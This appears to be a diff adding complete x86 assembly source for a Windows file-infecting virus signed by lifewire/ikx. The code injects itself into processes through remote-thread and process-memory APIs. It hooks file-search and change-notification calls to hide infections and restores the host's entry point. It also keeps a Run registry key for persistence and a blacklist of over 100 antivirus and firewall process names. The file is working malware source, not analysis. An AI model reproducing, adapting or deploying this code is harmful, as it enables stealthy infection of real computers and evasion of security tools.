@@ -1,0 +1,572 @@
+   .386
+   .model flat,STDCALL
+   locals __
+   include inc\asm.inc
+   .data
+   bla db ?
+
+   .code
+
+   ;exported data
+   public _crcs
+   public _blacklist
+   public _org9entry
+   public _hostentryrva
+   public _startupregkey
+
+   ;exported functions
+   public @getk32base
+   public @crc32
+   public @memcpy
+   public @poordasm
+   public @hookentry
+
+   ;called functions
+   extern @finddatastealth:proc;
+   extern @import:proc;
+   extern @makeresident:proc;
+   extern @hookhandler:proc;
+   extern @changeprot:proc;
+
+   ;----------------------------------------------------------------------------;
+   main:           ;int     3
+                   nop
+                   push    eax                     ;reserve a ret add
+                   pushad
+                   mov     ebp,esp
+                   add     esp,-200h
+
+                   call    __next
+   __next:         pop     edi
+                   sub     edi,(offset __next-main);
+
+                   lea     ebx,[ebp-200h]
+
+                   call    @getk32base
+
+                   lea     edx,[edi+(_crcs-main)]  ;int* crcs
+                   mov     ecx,ebx                 ;int* imports
+                   ;void __fastcall import(int base, int* crcs, int* imports)
+                   call    @import
+
+                   call    [ebp-200h+(getversion__-apilist__)]
+                   or      eax,eax                 ;is NT?
+                   js      __restorehost
+                   cmp     al,5                    ;is NT5?
+                   jne     __restorehost
+
+                   mov     eax,ebx                 ;api*
+                   mov     edx,edi                 ;void* viralimagebaes
+                   ;void __fastcall makeresident(api* a, void* vimbase)
+                   call    @makeresident
+
+   __restorehost:  call    __z
+
+   _org9entry      db      0e8h,6bh,04ch,0a7h,77h
+                   db      4 dup (0c3h)
+
+   __z:            pop     esi
+
+                   mov     edi,offset _org9entry
+     _hostentryrva equ $-4
+
+                   mov     eax,ebx                 ;api*a
+                   mov     edx,edi                 ;address
+                   push    4                       ;page_readwrite
+                   pop     ecx
+                   ;int __fastcall changeprot(api* a,void* address,int flags)
+                   call    @changeprot
+
+                   mov     [ebp+20h],edi             ;return rva
+
+                   push    9
+                   pop     ecx
+           rep     movsb
+
+                   mov     esp,ebp
+                   popad
+                   ret
+   ;----------------------------------------------------------------------------;
+
+
+
+
+   ;----------------------------------------------------------------------------;
+   _crcs:          dd 0
+
+   apilist__:      crc32m  <CreateFileW>
+                   crc32m  <FindFirstChangeNotificationW>
+                   crc32m  <FindFirstFileExW>
+                   crc32m  <FindNextFileW>
+   getversion__:   crc32m  <GetVersion>
+                   crc32m  <LoadLibraryA>
+                   crc32m  <GetProcAddress>
+                   crc32m  <CreateFileMappingW>
+                   crc32m  <MapViewOfFile>
+                   crc32m  <CloseHandle>
+                   crc32m  <UnmapViewOfFile>
+                   crc32m  <VirtualAllocEx>
+                   crc32m  <VirtualFree>
+                   crc32m  <VirtualProtect>
+                   crc32m  <VirtualQuery>
+                   crc32m  <OpenProcess>
+                   crc32m  <ReadProcessMemory>
+                   crc32m  <WriteProcessMemory>
+                   crc32m  <CreateRemoteThread>
+                   crc32m  <GetModuleHandleA>
+                   crc32m  <GetLastError>
+                   crc32m  <SetLastError>
+                   crc32m  <FindFirstFileW>
+                   crc32m  <FindClose>
+                   crc32m  <FileTimeToSystemTime>
+                   crc32m  <SystemTimeToFileTime>
+                   crc32m  <GetFileSize>
+                   crc32m  <WideCharToMultiByte>
+                   crc32m  <SetFilePointer>
+                   crc32m  <SetEndOfFile>
+                   crc32m  <SetFileTime>
+                   crc32m  <GetFileTime>
+                   crc32m  <Sleep>
+                   crc32m  <GetModuleFileNameA>
+                   crc32m  <GetSystemDirectoryW>
+                   crc32m  <GetTickCount>
+                   crc32m  <GetFullPathNameW>
+                   crc32m  <lstrlenW>
+                   crc32m  <IsBadWritePtr>
+                   dd 0
+
+                   db      "user32",0,0
+                   crc32m  <CharUpperA>
+                   dd 0
+
+                   db      "psapi",0,0,0
+                   crc32m  <EnumProcesses>
+                   crc32m  <EnumProcessModules>
+                   dd 0
+
+                   db      "sfc",0,0,0,0,0
+                   crc32m  <SfcIsFileProtected>
+                   dd 0
+
+                   db      "advapi32",0            ;screws up alignment
+                   crc32m  <RegOpenKeyExA>
+                   crc32m  <RegEnumValueW>
+                   crc32m  <RegCloseKey>
+                   dd      0
+
+                   dd 0
+   ;----------------------------------------------------------------------------;
+
+
+
+
+   ;----------------------------------------------------------------------------;
+   @hookentry      proc
+                   mov     cl,0    ;createfilew
+                   jmp     __e
+                   mov     cl,1    ;findfirstchangenotificationw
+                   jmp     __e
+                   mov     cl,2    ;findfirstfileexw
+                   jmp     __e
+                   mov     cl,3    ;findnextfilew
+   __e:
+
+                   push    eax
+                   pushad
+
+                   call    __q
+           __next:
+                   ;int     3
+                   nop
+                   mov     esp,[esp+8]
+                   jmp     hook_leave
+           __q:    xor     edx,edx
+                   pop     eax
+                   push    eax
+                   push    dword ptr fs:[edx]
+                   mov     fs:[edx],esp
+
+                   sub     eax,(offset __next-main)    ;base
+
+                   movzx   ecx,cl
+
+                   push    ecx
+                   shl     ecx,4
+                   lea     edx,[ecx+eax+4000h-100h];return address of hookentry
+                   pop     ecx
+                   mov     [esp+28h],edx             ;points to hook-restorder
+
+                   cmp     cl,2
+                   je      hook_fff                    ;findfirstfileex
+                   cmp     cl,3
+                   je      hook_fnf                    ;findnextfile
+                   cmp     cl,1                        ;findfirstchange
+                   je      hook_ffc
+
+                   lea     edx,[esp+28h+4+4]           ;pointer to arg1
+                   push    edx
+                   mov     edx,[edx]                   ;arg1
+
+                   call    @hookhandler    ;hookhandler(base,arg1,number,&arg1)
+
+   hook_leave:     pop     dword ptr fs:[0]
+                   pop     eax
+
+                   popad
+                   ret
+   @hookentry      endp
+   ;----------------------------------------------------------------------------;
+
+
+
+
+   ;----------------------------------------------------------------------------;
+   hook_fff:       xchg    eax,edi
+
+                   cmp     dword ptr [esp+28h+4+(2*4)],0   ;FindExInfoStandard
+                   jne     hook_leave
+
+                   push    dword ptr [esp+28h+4+(6*4)]
+                   push    dword ptr [esp+28h+4+(6*4)]
+                   push    dword ptr [esp+28h+4+(6*4)]
+                   mov     ebx,dword ptr [esp+28h+4+(6*4)]
+                   push    ebx
+                   push    dword ptr [esp+28h+4+(6*4)]
+                   push    dword ptr [esp+28h+4+(6*4)]
+                   call    edx
+                   mov     [esp+8+pushad_eax],eax
+
+                   inc     eax
+                   jz      __s
+
+                   xchg    eax,edi                         ;base
+                   mov     edx,ebx                         ;wfd
+                   call    @finddatastealth
+
+               __s:pop     dword ptr fs:[0]
+                   pop     eax
+                   popad
+                   pop     ecx ;discard ret add of hook
+                   ret     6*4
+   ;----------------------------------------------------------------------------;
+
+   ;----------------------------------------------------------------------------;
+   hook_fnf:       xchg    eax,edi
+
+                   mov     ebx,dword ptr [esp+28h+4+(2*4)]     ;info
+                   push    ebx
+                   push    dword ptr [esp+28h+4+(2*4)]         ;filename
+                   call    edx
+                   mov     [esp+8+pushad_eax],eax
+
+                   or      eax,eax
+                   jz      __f
+
+                   xchg    eax,edi
+                   mov     edx,ebx
+                   call    @finddatastealth
+
+               __f:pop     dword ptr fs:[0]
+                   pop     eax
+                   popad
+                   pop     ecx ;discard ret add of hook
+                   ret     2*4
+   ;----------------------------------------------------------------------------;
+
+
+   _startupregkey  db "Software\Microsoft\Windows\CurrentVersion\Run",0
+
+
+   ;----------------------------------------------------------------------------;
+   ;findfirstchangenotification is handled in asm
+   hook_ffc:
+
+                   and     dword ptr [esp+28h+4+12],\
+                           not(FILE_NOTIFY_CHANGE_LAST_WRITE\
+                              +FILE_NOTIFY_CHANGE_SIZE\
+                              +FILE_NOTIFY_CHANGE_ATTRIBUTES)
+                   jnz     __q
+
+                   ;if no monitorflags are left after our and'ing, add this
+                   ;parameter, else the function fails i guess
+
+                   inc     dword ptr [esp+28h+4+12];FILE_NOTIFY_CHANGE_FILE_NAME
+
+   __q:
+
+                   jmp     hook_leave
+   ;----------------------------------------------------------------------------;
+
+
+
+
+   ;----------------------------------------------------------------------------;
+   ;int getk32base(void);
+   @getk32base     proc
+
+                   xor     eax,eax
+                   mov     edx,fs:[eax]                    ;get pointer into k32
+                   inc     edx
+   __x:            mov     ecx,[edx+3]                     ;
+                   mov     edx,[edx-1]
+                   inc     edx                             ;get last se handler
+                   jnz     __x
+
+                   mov     edx,"EP"
+                   xor     cx,cx                           ;64k alignment
+   __z:            movzx   eax,word ptr [ecx+03ch]
+                   cmp     dword ptr [ecx+eax],edx
+                   je      __y
+                   sub     ecx,10000h
+                   jmp     __z
+   __y:            xchg    eax,ecx
+                   ret
+
+   @getk32base     endp
+   ;----------------------------------------------------------------------------;
+
+
+   db "- SEVEN FACES - IKX -"
+
+
+   ;----------------------------------------------------------------------------;
+   ;void __fastcall memcpy(void* dst,void* src,int size);
+   @memcpy:        push    esi
+                   push    edi
+                   xchg    edi,eax
+                   mov     esi,edx
+           rep     movsb
+                   pop     edi
+                   pop     esi
+                   ret
+   ;----------------------------------------------------------------------------;
+
+
+
+
+   ;----------------------------------------------------------------------------;
+   ;thanks to some av description (106 entries)
+   _blacklist:
+   crc32m <ZONEALARM.EXE>
+   crc32m <YAPS.EXE>
+   crc32m <WFINDV32.EXE>
+   crc32m <WEBSCANX.EXE>
+   crc32m <VSSTAT.EXE>
+   crc32m <VSHWIN32.EXE>
+   crc32m <VSECOMR.EXE>
+   crc32m <VSCAN40.EXE>
+   crc32m <VETTRAY.EXE>
+   crc32m <VET95.EXE>
+   crc32m <TDS2-NT.EXE>
+   crc32m <TDS2-98.EXE>
+   crc32m <TCA.EXE>
+   crc32m <TBSCAN.EXE>
+   crc32m <SWEEP95.EXE>
+   crc32m <SPHINX.EXE>
+   crc32m <SMC.EXE>
+   crc32m <SERV95.EXE>
+   crc32m <SCRSCAN.EXE>
+   crc32m <SCANPM.EXE>
+   crc32m <SCAN95.EXE>
+   crc32m <SCAN32.EXE>
+   crc32m <SAFEWEB.EXE>
+   crc32m <RESCUE.EXE>
+   crc32m <RAV7WIN.EXE>
+   crc32m <RAV7.EXE>
+   crc32m <PERSFW.EXE>
+   crc32m <PCFWALLICON.EXE>
+   crc32m <PCCWIN98.EXE>
+   crc32m <PAVW.EXE>
+   crc32m <PAVSCHED.EXE>
+   crc32m <PAVCL.EXE>
+   crc32m <PADMIN.EXE>
+   crc32m <OUTPOST.EXE>
+   crc32m <NVC95.EXE>
+   crc32m <NUPGRADE.EXE>
+   crc32m <NORMIST.EXE>
+   crc32m <NMAIN.EXE>
+   crc32m <NISUM.EXE>
+   crc32m <NAVWNT.EXE>
+   crc32m <NAVW32.EXE>
+   crc32m <NAVNT.EXE>
+   crc32m <NAVLU32.EXE>
+   crc32m <NAVAPW32.EXE>
+   crc32m <N32SCANW.EXE>
+   crc32m <MPFTRAY.EXE>
+   crc32m <MOOLIVE.EXE>
+   crc32m <LUALL.EXE>
+   crc32m <LOOKOUT.EXE>
+   crc32m <LOCKDOWN2000.EXE>
+   crc32m <JEDI.EXE>
+   crc32m <IOMON98.EXE>
+   crc32m <IFACE.EXE>
+   crc32m <ICSUPPNT.EXE>
+   crc32m <ICSUPP95.EXE>
+   crc32m <ICMON.EXE>
+   crc32m <ICLOADNT.EXE>
+   crc32m <ICLOAD95.EXE>
+   crc32m <IBMAVSP.EXE>
+   crc32m <IBMASN.EXE>
+   crc32m <IAMSERV.EXE>
+   crc32m <IAMAPP.EXE>
+   crc32m <FRW.EXE>
+   crc32m <FPROT.EXE>
+   crc32m <FP-WIN.EXE>
+   crc32m <FINDVIRU.EXE>
+   crc32m <F-STOPW.EXE>
+   crc32m <F-PROT95.EXE>
+   crc32m <F-PROT.EXE>
+   crc32m <F-AGNT95.EXE>
+   crc32m <ESPWATCH.EXE>
+   crc32m <ESAFE.EXE>
+   crc32m <ECENGINE.EXE>
+   crc32m <DVP95_0.EXE>
+   crc32m <DVP95.EXE>
+   crc32m <CLEANER3.EXE>
+   crc32m <CLEANER.EXE>
+   crc32m <CLAW95CF.EXE>
+   crc32m <CLAW95.EXE>
+   crc32m <CFINET32.EXE>
+   crc32m <CFINET.EXE>
+   crc32m <CFIAUDIT.EXE>
+   crc32m <CFIADMIN.EXE>
+   crc32m <BLACKICE.EXE>
+   crc32m <BLACKD.EXE>
+   crc32m <AVWUPD32.EXE>
+   crc32m <AVWIN95.EXE>
+   crc32m <AVSCHED32.EXE>
+   crc32m <AVPUPD.EXE>
+   crc32m <AVPTC32.EXE>
+   crc32m <AVPM.EXE>
+   crc32m <AVPDOS32.EXE>
+   crc32m <AVPCC.EXE>
+   crc32m <AVP32.EXE>
+   crc32m <AVP.EXE>
+   crc32m <AVNT.EXE>
+   crc32m <AVKSERV.EXE>
+   crc32m <AVGCTRL.EXE>
+   crc32m <AVE32.EXE>
+   crc32m <AVCONSOL.EXE>
+   crc32m <AUTODOWN.EXE>
+   crc32m <APVXDWIN.EXE>
+   crc32m <ANTI-TROJAN.EXE>
+   crc32m <ACKWIN32.EXE>
+   crc32m <_AVPM.EXE>
+   crc32m <_AVPCC.EXE>
+   crc32m <written by lifewire/ikx, with love from holland>
+   ;----------------------------------------------------------------------------;
+
+
+
+
+   ;----------------------------------------------------------------------------;
+   ;poor disassembler. whatever, it aint a real disassembler anyway :)
+   ;used for api hooking to retrieve the first n bytes (n should be >= 5)
+   ;int __fastcall poordasm(void* code)
+   @poordasm:      push    esi
+                   xchg    esi,eax
+                   xor     ecx,ecx
+                   lodsd
+
+                   cmp     al,8bh
+                   jne     __1
+                   cmp     ah,0ech
+                   je      pd_2    ;mov ebp,esp
+               __1:
+                   cmp     al,0ffh
+                   jne     __2
+                   cmp     ah,75h  ;push dwo[ebp+imm8]
+                   je      pd_3
+
+              __2:
+   ;               ;not smart to copy relative calls :)
+   ;                cmp     al,0e8h
+   ;                je      pd_5    ;call
+
+                   cmp     al,33h
+                   jne     __3
+                   cmp     al,0c0h
+                   jae     pd_2    ;xor reg,mem / xor reg,reg
+
+              __3:
+
+                   cmp     al,83h
+                   jne     __4
+                   cmp     ah,0ech
+                   je      pd_3
+
+             __4:
+
+                   cmp     al,2bh
+                   jne     __5
+
+                   cmp     ah,0c0h
+                   jae     pd_2    ;sub reg,reg
+
+             __5:
+
+                   cmp     al,06ah
+                   je      pd_2    ;push imm8
+
+                   cmp     al,68h
+                   je      pd_5    ;push imm32
+
+                   cmp     al,81h
+                   jne     __6
+                   cmp     ah,0ech ;sub esp,imm32 - used in findfirstfileexw
+                   je      pd_6
+
+             __6:
+
+                   and     al,11110000b
+                   cmp     al,50h
+                   je      pd_1    ;push or pop reg
+
+                   jmp     pd_0
+
+           pd_6:   inc     ecx
+           pd_5:   inc     ecx
+                   inc     ecx
+           pd_3:   inc     ecx
+           pd_2:   inc     ecx
+           pd_1:   inc     ecx
+
+           pd_0:   pop     esi
+                   xchg    eax,ecx
+                   ret
+   ;----------------------------------------------------------------------------;
+
+
+
+
+   ;----------------------------------------------------------------------------;
+   ;int __fastcall crc32(char*);
+   @crc32          proc
+                   push    esi
+                   xchg    eax,esi
+                   mov     edx,mCRC32_init
+           gCRC32_next_byte:
+                   lodsb
+                   or      al,al           ;end of name ?
+                   jz      gCRC32_finish
+
+                   xor     dl,al
+                   mov     al,08h
+           gCRC32_next_bit:
+                   shr     edx,01h
+                   jnc     gCRC32_no_change
+                   xor     edx,mCRC32
+           gCRC32_no_change:
+                   dec al
+                   jnz     gCRC32_next_bit
+                   jmp     gCRC32_next_byte
+           gCRC32_finish:
+                   xchg    eax,edx         ;CRC32 to EAX
+                   pop     esi
+                   ret
+
+   @crc32          endp
+   ;----------------------------------------------------------------------------;
+
+
+   end main
